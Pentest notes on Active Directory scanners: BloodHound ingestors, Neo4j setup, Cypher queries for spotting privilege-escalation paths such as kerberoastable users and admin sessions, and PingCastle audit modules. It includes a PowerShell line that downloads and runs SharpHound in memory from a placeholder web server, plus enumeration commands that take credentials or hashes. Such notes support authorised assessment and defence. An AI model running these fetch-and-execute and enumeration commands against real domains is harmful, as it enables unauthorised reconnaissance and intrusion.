# Active Directory - Automatic scanners

### BloodHound

`BloodHound` uses graph theory to reveal the hidden and often unintended
relationships within an Active Directory environment. `BloodHound` can be used
to easily identify highly complex attack paths that would otherwise be
impossible to quickly identify.

The official installation procedure is available on the `GitHub` repository:
`https://github.com/BloodHoundAD/BloodHound/wiki/Getting-started`

###### BloodHound ingestors

*SharpHound*

`SharpHound` is a C# data ingestor used by `BloodHound` to enumerate the Active
Directory targeted domain. A PowerShell script `SharpHound.ps1`, in-lining the
C# DLL, is available as well.

By default, `SharpHound` will output multiples JSON files in a compressed zip
archive file that can directly be imported for graphical review and query in
`BloodHound`.

Multiples collection methods are available:

| CollectionMethod | Description |
|------------------|-------------|
| Default | Performs group membership collection, domain trust collection, local admin collection, and session collection |
| Group | Performs group membership collection |
| LocalAdmin | Performs local admin collection |
| LocalGroup | Performs local groups collection. No longer uses the `NetLocalGroupGetMembers` Windows API, rely instead on lower-levels API calls to the `SAMRPC` library to access the remote computer SAM |
| RDP | Performs Remote Desktop Users collection |
| DCOM | Performs Distributed COM Users collection |
| GPOLocalGroup | Performs local admin collection using Group Policy Objects |
| Session | Performs session collection |
| ComputerOnly | Performs local admin, RDP, DCOM and session collection |
| LoggedOn | Performs privileged session collection (requires admin rights on target systems) |
| Trusts | Performs domain trust enumeration |
| ACL | Performs collection of ACLs |
| Container | Performs collection of Containers |
| DcOnly | Performs collection using LDAP only. Includes Group, Trusts, ACL, ObjectProps, Container, and GPOLocalGroup. |
| All | Performs all Collection Methods except GPOLocalGroup |

Usage:

```bash
# PowerShell SharpHound.ps1 collector.
# The SharpHound.ps1 PowerShell collector script in-lines the SharpHound C# DLL.
# Multiple ways can be used to import or directly inject into memory the SharpHound.ps1 script.
Import-Module SharpHound.ps1

IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/SharpHound.ps1');

(New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');

Invoke-Bloodhound -Verbose -CollectionMethod <all | DcOnly | COLLECTION_METHOD>
Invoke-Bloodhound -Verbose -Domain '<DOMAIN_FQDN>' -DomainController '<DC_IP | DC_HOSTNAME>' -LDAPUsername '<USERNAME>' -LDAPPassword '<PASSWORD>' -CollectionMethod <all | DcOnly | COLLECTION_METHOD>

# C# SharpHound.exe collector.
SharpHound.exe -v -c <all | DcOnly | COLLECTION_METHOD>
SharpHound.exe -v --Domain '<DOMAIN_FQDN>' --domaincontroller '<DC_IP | DC_HOSTNAME>' --ldapusername '<USERNAME>' --ldappassword '<PASSWORD>' -c <all | DcOnly | COLLECTION_METHOD>
```

*BloodHound.py*

`bloodhound-python.py` is a Python based ingestor for `BloodHound`, based on
the `Impacket` suite and only compatible with `BloodHound 3.0`, or newer
versions. `bloodhound-python.py` presents the main advantage of being usable on
Linux systems and thus easily integrates with `proxychains` for pivoted Active
Directory enumeration.

`bloodhound-python.py` supports most of `SharpHound` collect methods, specified
above, except `GPOLocalGroup` and `LocalGroup`.

```bash
bloodhound-python -v -CollectionMethod  <all | DcOnly | <COLLECTION_METHOD>

# The specified domain controller must be a hostname. The -ns must be specified to a DNS server IP if the DC hostname is not resolved by the local system.
# --dns-tcp: The DNS queries will be made over TCP instead of UDP, useful to enumerate over SOCKS4 proxies which do not support the UDP protocol.
bloodhound-python -v --dns-tcp -dc <DC_HOSTNAME> -ns <DNS_SERVER_IP> -d <DOMAIN_FQDN> -u <USERNAME> [-p <PASSWORD> | --hashes ':<NTLM>'] -CollectionMethod  <all | DcOnly | <COLLECTION_METHOD>
```

*Sysinternals's AdExplorer and ADExplorerSnapshot.py*

Active Directory domain snapshots taken with `AdExplorer` can be converted to
`JSON` files supported by `BloodHound` using the
[`ADExplorerSnapshot.py`](https://github.com/c3c/ADExplorerSnapshot.py) Python
script. `AdExplorer` can thus be used as an ingestor for `BloodHound`. Refer to
the `[ActiveDirectory] Recon - Domain Recon` note for more information on
`AdExplorer`.

A few limitations are however to be noted:
  - the snapshot only contains information on Active Directory objects
    (assimilable to a `DcOnly` collection made with `SharpHound`).
  - `Organizational Units` and `Group Policy Objects` information will be
    missing.

```
ADExplorerSnapshot.py [-o <OUTPUT_FOLDER>] <ADEXPLORER_SNAPSHOT>
```

The resulting `JSON` files can be imported normally through the `BloodHound`
graphical interface.

###### Multiple Neo4j databases to handle different environments

The [`Neo4j Desktop`](https://neo4j.com/download/) application can be used to
create and manage multiple databases. Due to `Neo4j Community` limitations, the
usage of the thick client is required as having multiple databases is otherwise
a feature of the `Enterprise` edition (as of 2022-01). Using multiple databases
present the notable advantage of allowing oneself to work on different
environments without requiring clears of the database and data reuploads.

The procedure to create multiple Neo4j databases through the `Neo4j Desktop`
application is as follow:

  1. Create a new project: `Projects (left menu) -> New`.

  2. Adds a `Local DBMS` per environment, forest or domain (depending on the
     level of separation wished):
     `Newly created project right panel -> (+) Add -> Local DBMS`. The name
     specified for the `DBMS` can match the environment / forest / domain (for
     example), and the password should be identical between `DBMS`.

     Each `Local DBMS` will be composed of the default `system` and `neo4j`
     databases.

  3. Switch between `DBMS`
     (`Mouse over the DBMS in the project right panel -> Start`) and add data as
     needed through the `BloodHound` interface.

Once the different databases are populated, simply starting a `DBMS` through the
`Neo4j Desktop` application allows to switch to a different environment in
`BloodHound` (without having to login / logoff or restart `BloodHound`).

###### BloodHound GUI

The following commands can be used to start `BloodHound`. The default neo4j
credentials are `neo4j:neo4j` and must be changed for the first login.

```bash
# Windows
net start neo4j
.\BloodHound.exe

# Linux
# "neo4j start" may lead to errors if executed as non root account.
neo4j start
neo4j console

bloodhound
```

The zip archive files produced by `SharpHound` can simply be drag and dropped
in the `BloodHound` graphical interface for treatment. The `Upload` button
on the right may be used as well.

###### BloodHound / Neo4j Cypher queries

*Neo4j Cyper 101*

The `Neo4j` graph databases implements its own query language: `Cypher`. Raw
`Cypher` queries can be made directly through the `BloodHound` GUI interface,
in complement to the predefined `BloodHound` queries. Queries may also be
executed through the `Neo4j` console (by default accessible using the `Neo4j`
web interface at `http://localhost:7474/browser/`). The `Neo4j` console
automatically display by default all the edges between nodes, which may be
useful in some case but is more resources intensive.

`Cypher` is a "visual" language modeling a starting and ending nodes, linked by
an edge. Queries are constructed using parenthesis, brackets, and arrow, with a
very basic query looking like:

```
(StartNode)-[IsConnectedTo]->(EndNode)
```

`Cypher` implements two basic clauses, `MATCH` and `RETURN`:
  - The `MATCH` clause specify the patterns `Neo4j` will search for in the
  database. `MATCH` is often coupled to a `WHERE` conditional statement that
  adds restrictions to the data retrieved.
  - The `RETURN` clause defines what to include in the query result
  set, which can be nodes, relationships, or nodes / relationships properties.

The relationship type and depth can be specified inside the brackets. For
instance, the following link `-[r:MemberOf]->` specify that the starting node
should be a direct member of the group ending node, while the link
`-[r:MemberOf*1..]->` indicate that the `MemberOf` relationship may repeat any
number of time and thus the starting node may be recursively a member of the
group ending node.

`Neo4j` `Cypher` also implements the `shortestPath` and `allShortestPaths`
functions that return, respectively, the shortest path and all the shortest
paths (all paths with the same minimal amount of hops) from a starting node,
or set of nodes, to an ending node, or set of nodes.

The following basic queries illustrate the use of the `MATCH` and `RETURN`
clauses as well as the linking syntax:

```
# Returns all Nodes in the database
MATCH (X) RETURN X

# Returns all domain in the database (and their relationships if executed through the Neo4j console)
MATCH (X:Domain) RETURN X
# With relationships from BloodHound GUI
MATCH p=(n:Domain)-[r]-(m:Domain) RETURN p

# Returns all users in the database
MATCH (X:User) RETURN X

# Returns all groups in the database
MATCH (X:Group) RETURN X

# Returns all computers in the database
MATCH (X:Computer) RETURN X

# Returns all OU in the database
MATCH (X:OU) RETURN X

# Returns all GPO in the database
MATCH (X:GPO) RETURN X

# Return the <OBJECT> (User, Group, Computer, OU or GPO) <NAME> (SAMACCOUNTNAME@DOMAIN_FQDN). Both queries are equivalent.
MATCH (n:<OBJECT> {name:"<NAME>"}) RETURN n
MATCH (n:<OBJECT>) WHERE n.name = "<NAME>" RETURN n

# Return the security principals directly member of the specified group <GROUP> (SAMACCOUNTNAME@DOMAIN_FQDN)
MATCH p=(n)-[b:MemberOf]->(c:Group {name: "<GROUP>"}) RETURN p

# Return all the security principals recursively member of the specified group <GROUP> (SAMACCOUNTNAME@DOMAIN_FQDN)
MATCH p=(n)-[b:MemberOf*1..]->(c:Group {name: "<GROUP>"}) RETURN p

# Return the names of the groups the specified user is a member of.
MATCH (u:User) WHERE u.name =~ "<USERNAME_IN_CAPS>@<DOMAIN_FQDN_IN_CAPS>" MATCH p=(u)-[b:MemberOf*1..]->(g:Group) RETURN g.name

# Return the path of the specified relationship type from any object to any objects
MATCH p=()-[r:<RELATIONSHIP>*1..]->() RETURN p

# Return shortest path from the Domain Users group to Domain Admins group
MATCH (g:Group) WHERE g.name =~ 'DOMAIN USERS@.*' MATCH (g1:Group) WHERE g1.name =~ 'DOMAIN ADMINS@.*' OPTIONAL MATCH p=shortestPath((g)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(g1)) RETURN p

# Return all shortest paths from Domain Users to Domain Admins
MATCH (g:Group) WHERE g.name =~ 'DOMAIN USERS@.*' MATCH (g1:Group) WHERE g1.name =~ 'DOMAIN ADMINS@.*' OPTIONAL MATCH p=allShortestPaths((g)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(g1)) RETURN p
```

The following operators are supported in the conditional `WHERE` statements:

| Operator | Definition |
|----------|-----------|
| NOT | Negate the subsequent condition |
| = | Is equal to |
| <> | is different to |
| < | Is less than |
| <= | Is less or equal
| > | Greater than |
| >= | Is greater or equal to |
| IS NULL | Is null |
| IS NOT NULL | Is not null |
| STARTS WITH | String starts with |
| ENDS WITH | String ends with |
| CONTAINS | String contains |
| =~ | String RegEx search |

The relationship between nodes can be of the following types:
  - `AddAllowedToAct`
  - `AddMember`
  - `AdminTo`
  - `AllExtendedRights`
  - `AllowedToAct`
  - `AllowedToDelegate`
  - `CanPSRemote`
  - `CanRDP`
  - `Contains`
  - `ExecuteDCOM`
  - `ForceChangePassword`
  - `GenericAll`
  - `GenericWrite`
  - `GetChanges`
  - `GetChangesAll`
  - `GPLink`
  - `HasSession`
  - `HasSIDHistory`
  - `Owns`
  - `MemberOf`
  - `ReadGMSAPassword`
  - `ReadLAPSPassword`
  - `SQLAdmin`
  - `TrustedBy`
  - `WriteDACL`
  - `WriteOwner`

For more information about the `Neo4j` `Cypher` language, its use in
`BloodHound` and `BloodHound` in general, the following resource may be
consulted:

```
https://www.ernw.de/download/BloodHoundWorkshop/ERNW_DogWhispererHandbook.pdf#page=45&zoom=100,92,390
```

*BloodHound built-in Cypher queries*

`BloodHound` implements a number of `Cypher` queries, titled:
  - Find all Domain Admins
  - Find Shortest Paths to Domain Admins
  - Find Principals with DCSync Rights
  - Users with Foreign Domain Group Membership
  - Groups with Foreign Domain Group Membership
  - Map Domain Trusts
  - Shortest Paths to Unconstrained Delegation Systems
  - Shortest Paths from Kerberoastable Users
  - Shortest Paths to Domain Admins from Kerberoastable Users
  - Shortest Path from Owned Principals
  - Shortest Paths to Domain Admins from Owned Principals
  - Shortest Paths to High Value Targets
  - Find Computers where Domain Users are Local Admin
  - Find Computers where Domain Users can read LAPS passwords
  - Shortest Paths from Domain Users to High Value Targets
  - Find All Paths from Domain Users to High Value Targets
  - Find Workstations where Domain Users can RDP
  - Find Servers where Domain Users can RDP
  - Find Dangerous Rights for Domain Users Groups
  - Find Kerberoastable Members of High Value Groups
  - List all Kerberoastable Accounts
  - Find Kerberoastable Users with most privileges
  - Find Domain Admin Logons to non-Domain Controllers
  - Find Computers with Unsupported Operating Systems
  - Find AS-REP Roastable Users (DontReqPreAuth)

*Custom Cypher queries*

Most of the queries below are from, or inspired from, previous work made by
`@Haus3c`.

The following queries were validated in the `Neo4j` console.

```
# Kerberoasting.
# Find all users with an SPN (kerberoastable users).
MATCH (n:User) WHERE n.hasspn=true RETURN n

# Find all users with an SPN (kerberoastable users) with passwords last set > 5 years ago.
MATCH (u:User) WHERE u.hasspn=true AND u.pwdlastset < (datetime().epochseconds - (1825 * 86400)) AND NOT u.pwdlastset IN [-1.0, 0.0] RETURN u.name, u.pwdlastset order by u.pwdlastset

# Find SPNs all users with an SPN containing the specified keywords <KEYWORD>.
MATCH (u:User) WHERE ANY (x IN u.serviceprincipalnames WHERE toUpper(x) CONTAINS '<KEYWORD>')RETURN u

# AS_REP roasting.
# Find all users that do not require Kerberos pre-authentication SPN (AS_REP roastable users).
MATCH (n:User) WHERE n.dontreqpreauth=true RETURN n

# Computers using an unsupported operating system, with a logon in the last 6 months.
MATCH (c:Computer) WHERE c.operatingsystem =~ "(?i).*(2000|2003|2008|xp|vista|7|me).*" AND (c.lastlogontimestamp < (datetime().epochseconds - (6 * 30 * 86400)) OR c.lastlogon < (datetime().epochseconds - (6 * 30 * 86400))) RETURN c.name,c.operatingsystem

# Sessions enumeration.
# Domains Admins and Enterprise Admins sessions opened on computers except Domain Controllers.
OPTIONAL MATCH (c:Computer)-[:MemberOf*1..]->(t:Group) WHERE NOT t.objectid ENDS WITH '-516' WITH c as NonDC MATCH p=(NonDC)-[:HasSession]->(n:User)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH '-512' OR g.objectid ENDS WITH '-519' RETURN DISTINCT (n.name) as Username, COUNT(DISTINCT(NonDC)) as Connexions ORDER BY COUNT(DISTINCT(NonDC)) DESC
OPTIONAL MATCH (c:Computer)-[:MemberOf]->(t:Group) WHERE NOT t.name = 'DOMAIN CONTROLLERS@TESTLAB.LOCAL' WITH c as NonDC MATCH p=(NonDC)-[:HasSession]->(n:User)-[:MemberOf*1..]->(g:Group {name:”DOMAIN ADMINS@TESTLAB.LOCAL”}) RETURN DISTINCT (n.name) as Username, COUNT(DISTINCT(NonDC)) as Connexions ORDER BY COUNT(DISTINCT(NonDC)) DESC

# Remote execution privileges.
# Local Administrators.
# First degree membership of the specified domain user to the local Administrators groups of any computers in the BloodHound database (current domain and others integrated domains).
MATCH (u:User) WHERE u.name =~ "<USERNAME_IN_CAPS>@<DOMAIN_FQDN_IN_CAPS>" MATCH (c:Computer) MATCH p=allShortestPaths((u)-[r:AdminTo]->(c)) RETURN c.name
# Both first degree and group delegated membership of the specified domain user to the local Administrators groups of any computers in the BloodHound database (current domain and others integrated domains).
MATCH (u:User) WHERE u.name =~ "<USERNAME_IN_CAPS>@<DOMAIN_FQDN_IN_CAPS>" MATCH (c:Computer) MATCH p=allShortestPaths((u)-[r:AdminTo|MemberOf*1..]->(c)) RETURN c.name

# Membership of Everyone, Anonymous, Authenticated Users, Domain Users or Domain Computers to the local Administrators group of any computers in the BloodHound database (current domain and others integrated domains).
MATCH (g:Group) WHERE g.objectid ENDS WITH '-513' OR g.objectid ENDS WITH 'S-1-5-11' OR g.objectid ENDS WITH 'S-1-1-0' OR g.objectid ENDS WITH 'S-1-5-7' MATCH (c:Computer) MATCH p=allShortestPaths((g)-[r:AdminTo]->(c)) RETURN c.name

# Possible code execution (local Administrators, Remote Desktop Users, Distributed COM users, LAPS password delegation, etc.).
# Possible code execution of the specified domain user to all computers integrated in the BloodHound database.
MATCH (u:User) WHERE u.name =~ "<USERNAME_IN_CAPS>@<DOMAIN_FQDN_IN_CAPS>" MATCH (c:Computer) MATCH p=allShortestPaths((g)-[r:AdminTo|GenericAll|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|ReadLAPSPassword|SQLAdmin|CanPSRemote]->(c)) RETURN c.name
# Possible code execution of Everyone, Anonymous, Authenticated Users, Domain Users or Domain Computers to all computers integrated in the BloodHound database.
MATCH (g:Group) WHERE g.objectid ENDS WITH '-513' OR g.objectid ENDS WITH 'S-1-5-11' OR g.objectid ENDS WITH 'S-1-1-0' OR g.objectid ENDS WITH 'S-1-5-7' MATCH (c:Computer) MATCH p=allShortestPaths((g)-[r:AdminTo|GenericAll|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|ReadLAPSPassword|SQLAdmin|CanPSRemote]->(c)) RETURN c.name

# Kerberos delegations.
# Computers, except Domain Controllers, that are trusted to perform unconstrained delegation.
MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH "-516" WITH COLLECT(c1.name) AS domainControllers MATCH (c2:Computer {unconstraineddelegation:true}) WHERE NOT c2.name IN domainControllers RETURN c2.name,c2.operatingsystem ORDER BY c2.name ASC
# Users trusted that are trusted to perform unconstrained delegation.
MATCH (u:User {unconstraineddelegation:true}) RETURN u.name,u.description,u.serviceprincipalnames,u.lastlogon,u.lastlogontimestamp

# Advanced control paths.
# Shortest path from Everyone, Anonymous, Authenticated Users, Domain Users or Domain Computers to Enterprise Admins, Domain Admins, KRBTGT, domain built-in Administrator, Domain Controllers,	Cert Publishers, Schema Admins, Key Admins, Enterprise Key Admins, Account Operators, Server Operators, Print Operators or Backup Operators.
MATCH (g:Group) WHERE g.objectid ENDS WITH '-513' OR g.objectid ENDS WITH '-515' OR g.objectid ENDS WITH 'S-1-5-11' OR g.objectid ENDS WITH 'S-1-1-0' OR g.objectid ENDS WITH 'S-1-5-7' MATCH (m:Group) WHERE m.objectid ENDS WITH 'S-1-5-9' OR m.objectid ENDS WITH '-500' OR m.objectid ENDS WITH '-502' OR m.objectid ENDS WITH '-512' OR m.objectid ENDS WITH '-516' OR m.objectid ENDS WITH '-517' OR m.objectid ENDS WITH '-518' OR m.objectid ENDS WITH '-519' OR m.objectid ENDS WITH '-526' OR m.objectid ENDS WITH '-527' OR m.objectid ENDS WITH '-548' OR m.objectid ENDS WITH '-549' OR m.objectid ENDS WITH '-550' OR m.objectid ENDS WITH '-551' MATCH p=allShortestPaths((g)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|Contains|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin|ReadGMSAPassword|HasSIDHistory|CanPSRemote*1..]->(m)) RETURN p

# Direct and potentially involuntary control (direct link with out MemberOf) of Everyone, Anonymous, Authenticated Users, Domain Users or Domain Computers to any domain objects.
# Adding the "MemberOf" relationship type may greatly complexify the reading of the resulting graph.
MATCH (source_object:Group) WHERE source_object.objectid ENDS WITH '-513' OR source_object.objectid ENDS WITH '-515' OR source_object.objectid ENDS WITH 'S-1-5-11' OR source_object.objectid ENDS WITH 'S-1-1-0' OR source_object.objectid ENDS WITH 'S-1-5-7' MATCH p=(source_object)-[r:AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(vulnerable_object) RETURN p
# Table form for exporting the results from the neo4j's console
MATCH (source_object:Group) WHERE source_object.objectid ENDS WITH '-513' OR source_object.objectid ENDS WITH '-515' OR source_object.objectid ENDS WITH 'S-1-5-11' OR source_object.objectid ENDS WITH 'S-1-1-0' OR source_object.objectid ENDS WITH 'S-1-5-7' MATCH p=(source_object)-[r:AdminTo|AllExtendedRights|AddMember|ForceChangePassword|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|CanRDP|ExecuteDCOM|AllowedToDelegate|ReadLAPSPassword|GpLink|AddAllowedToAct|AllowedToAct|SQLAdmin*1..]->(vulnerable_object) RETURN source_object.name,vulnerable_object.name,r

# Enumeration of GenericAll, WriteDacl and WriteOwner ACEs on all AD objects for all security principals except - ALL domains - privileged built-in groups and principals such as "Creator Owner" (SID: S-1-3-0) and Local System (SID: S-1-5-18).
MATCH (source_object) WHERE NOT source_object.objectid ENDS WITH "-512" AND NOT source_object.objectid ENDS WITH "-519" AND NOT source_object.objectid ENDS WITH "S-1-5-32-544" AND NOT source_object.objectid ENDS WITH "S-1-5-32-548" AND NOT source_object.objectid ENDS WITH "S-1-5-32-549" AND NOT source_object.objectid ENDS WITH "S-1-5-32-550" AND NOT source_object.objectid ENDS WITH "S-1-5-32-551" AND NOT source_object.objectid ENDS WITH "S-1-5-32-518" AND NOT source_object.objectid ENDS WITH "S-1-5-32-516" AND NOT source_object.objectid ENDS WITH "S-1-5-32-526" AND NOT source_object.objectid ENDS WITH "S-1-5-32-527" AND NOT source_object.objectid ENDS WITH "S-1-5-18" AND NOT source_object.objectid ENDS WITH "S-1-5-9" AND NOT source_object.objectid ENDS WITH "S-1-3-0" AND NOT source_object.objectid ENDS WITH "S-1-5-10" MATCH p=(source_object)-[r:GenericAll|Owns|WriteDacl|WriteOwner|ForceChangePassword]->(vulnerable_object) RETURN source_object.name,vulnerable_object.name,r

# More queries: https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
```

###### (Dirty) Manual analysis of SharpHound results

For larger Active Directory domains, specifics search on the `SharpHound`
resulting JSON files may be used to more rapidly identify entry point, such as
resources accessible to following groups:
- `Everyone`, SID: `S-1-1-0`
- `Anonymous`, SID: `S-1-5-7`
- `Authenticated Users`, SID: `S-1-5-11`
- `Users`, SID: `S-1-5-32-545`
- `Domain Users`, SID: `S-1-5-<DOMAIN>-513`
- `Domain Computers`, SID: `S-1-5-<DOMAIN>-515`

The following bash script can be used to convert the one-line JSON result of
`SharpHound` to a more human readable format:

```bash
#!/bin/bash
for filename in *.json; do
  echo $filename
  jq --color-output . $filename > $filename.jq
done
```

```bash
grep -A 10 -B 10 -rin "S-1-1-0\|S-1-5-7\|S-1-5-11\|S-1-5-32-545" *.jq
```

###### [Linux] BloodHound Owned

The `bh-owned.rb` ruby script can be used to automatically tag the provided
users from a file as owned or blacklist.

```bash
ruby bh-owned.rb -u neo4j -p <NEO4J_DB_PASSWORD> -a <COMPROMISED_USERS_FILE>
```

Note that the usernames must correspond to the `BloodHound` expected node
format: `UPPERCASE_USERNAME@UPPERCASE_DOMAIN_FQDN`.

```bash
#!/bin/bash

users_file='<USERNAMES_FILE>'
users_fqdn='<UPPERCASE_DOMAIN_FQDN>'

touch ./tmp_file
cat $users_file | while read line; do
  echo $line"@"$users_fqdn >> ./tmp_file
done

awk '{print toupper($0)}' < ./tmp_file > formated_users_file.txt
rm -rf ./tmp_file

ruby bh-owned.rb -u neo4j -p <NEO4J_DB_PASSWORD> -a <COMPROMISED_USERS_FILE>
```

### PingCastle

`PingCastle` is an `C#` application designed to run a number of security
checks, targeting the most common Active Directory security issues.
`PingCastle` generates an `HTLM` report summarizing the findings for the
`healthcheck` mode or produces text files for the individual modules.

Note that the licensing model of `PingCastle` specify the following:
  - "Except if a license is purchased, you are not allowed to make any profit
  from this source code"
  - "It is allowed to run PingCastle without purchasing any license on for
  profit companies if the company itself (or its ITSM provider) run it"

So in order to legally make use of `PingCastle`, a license must be purchased by
the auditor or the scans must be conducted by the audited company and the
results communicated to the auditors.

The `healthcheck` mode runs more that fifty checks, including:
  - Enumeration of the members of the domain privileged groups (`Enterprise
    Admins`, `Domain Admins`, built-in `Operators` groups, etc.).
  - Creation of a limited Active Directory control path graph to privileged
    groups, similar in nature but not as complete to what can be accomplished
    using `BloodHound`. `PingCastle`'s control path graphs are based on group
    memberships, `GPO` mapping and `Access Control List (ACL)` on privileged
    objects and can be visualized in the `Control Paths Analysis` section by
    clicking on the `Analysis` link of each privileged group.
  - Enumeration of the operating systems in use on the computers integrated to
    the Active Directory domain.
  - Enumeration of Active Directory privileges group memberships and
    users with the `admincount` bit set to 1 (accounts protected by the
    `AdminSdHolder` mechanism).
  - Verification of privileges security principals' and GPO's ACLs.
  - Search of `GPP` passwords and restricted groups definition in GPO.
  - Verification of the implementation of `Local Administrator Password
    Solution (LAPS)` and `Windows Event Forwarding` solutions.
  - Enumeration of privileged accounts that define a `ServicePrincipalName
    (SPN)` (and are thus prone to `Kerberoasting` attack).
  - Listing of user and machine accounts that can have an empty password as
    well as user accounts that do not require `Kerberos` pre-authentication
    (and are thus vulnerable to `ASP-Roast` attacks).
  - Enumeration of domain configured trusts.
  - Verification if the `Exchange Windows Permissions` security principal has
    the `WriteDacl` right in the root domain security descriptor
  - etc.

`PingCastle` can also be used to run a number of specific security scans
through various `modules`:

| Scan | Description |
|------|-------------|
| `aclcheck` | Check authorization related to users or groups. Default to everyone, authenticated users and domain users. |
| `antivirus` | Check for computers without known antivirus installed. It is used to detect unprotected computers but may also report computers with unknown antivirus. |
| `export_user` | Export all users of the AD with their creation date, last logon and last password change. |
| `foreignusers` | |
| `laps_bitlocker` | Check on the AD if LAPS and/or BitLocker has been enabled. Default check for all the computers in the domain. |
| `localadmin` | Enumerate the local Administrators of the specified computer or all computers in the domain. |
| `nullsession` | Check if null sessions are enabled. |
| `nullsession-trust` | Attempts to enumerate the Active Directory domain trusts through a null session. |
| `remote` | Checks for the presence of a remote desktop solution (RDP, TeamViewer, VNC, etc.) on the targeted computer(s). |
| `share` | List all shares published on the specified computer or all computers in the domain and determine if the share can be accessed by anyone. |
| `smb` | Scan the specified computer or all computers in the domain and determine the smb version available. Also check if SMB signing is enabled. |
| `spooler` | Check if the spooler service is remotely active on the specified computer or all computers in the domain. |
| `startup` | Get the last startup date of the specified computer or all computers in the domain. Can be used to determine if latest patches have been applied. |
| `zerologon` | Enumerates the Domain Controllers through AD requests and check for presence of the ZeroLogon vulnerability on all the enumerated Domain Controllers |

In order to execute `PingCastle` on a computer with out the `.NET framework
3.5` installed, the `PingCastle.pdb` and `PingCastle.exe.config` files must be
present in the same directory as the `PingCastle.exe` binary.

`PingCastle` can be launched in `interactive mode` using the current user
security context or with a specified account using the following commands.
Before running the `PingCastle`'s `healthcheck` mode, it is recommended to
remove the limitation of 100 users in the generated `HTML` report:
`5-advanced -> 4-noenumlimit`.

```bash
# Runs PingCastle in interactive mode.
PingCastle.exe

# Runs PingCastle's healthcheck mode with out the limitation of 100 users.
PingCastle.exe --no-enum-limit --healthcheck

# Runs the PingCastle's healthcheck on the specified domain using the provided credentials.
PingCastle.exe --server <DC_FQDN | DC_IP> --user "<DOMAIN>\<USERNAME>" --password "<PASSWORD>" --no-enum-limit --interactive

# Runs the PingCastle's healthcheck on all trusted domains.
# --explore-trust: on domains of a forest, runs the healthcheck on all trusted domains except domains of the forest and forest trusts.
# --explore-forest-trust: on the root domain of a forest, runs the healthcheck on all forest trusts discovered.
PingCastle.exe --explore-trust --explore-forest-trust --no-enum-limit --healthcheck

# Runs the specified scanner module.
PingCastle.exe --scanner "<MODULE_NAME>"
PingCastle.exe --server <DC_FQDN | DC_IP> --user "<DOMAIN>\<USERNAME>" --password "<PASSWORD>" --scanner "<MODULE_NAME>"

# Runs, as of PingCastle version 2.9.0.0, all the PingCastle available scanner modules.
$modules = @("aclcheck", "smb", "share", "localadmin", "spooler", "antivirus", "export_user", "foreignusers", "laps_bitlocker", "smb3querynetwork", "nullsession", "nullsession-trust", "oxidbindings")

foreach ($module in $modules) {
   .\PingCastle.exe --scanner "$module"
}
```

--------------------------------------------------------------------------------

### References

https://www.ernw.de/download/BloodHoundWorkshop/ERNW_DogWhispererHandbook.pdf#page=45&zoom=100,92,390

https://beta.hackndo.com/bloodhound/

https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/

https://neo4j.com/docs/cypher-manual/current/clauses/match/
